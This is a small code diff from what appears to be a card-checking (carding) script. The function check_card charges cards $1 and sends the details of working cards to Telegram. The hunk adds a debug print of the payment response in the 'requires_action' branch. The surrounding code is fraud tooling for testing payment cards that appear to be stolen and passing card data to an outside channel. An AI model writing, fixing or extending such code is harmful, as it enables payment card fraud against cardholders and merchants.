@@ -315,6 +315,9 @@ def check_card(card_details, heroku_auth_key):
                     send_to_telegram(f"{card_details} - Charged 1$ CVV Added Card !!")
                     return result
                 elif status == 'requires_action':
+                    # Debug: Print full response to see where decline info is
+                    print(f"Full response: {response_body}")
+                    
                     # Check for decline reason in last_payment_error
                     last_error = response_body.get('last_payment_error') or {}
                     decline_code = last_error.get('decline_code')
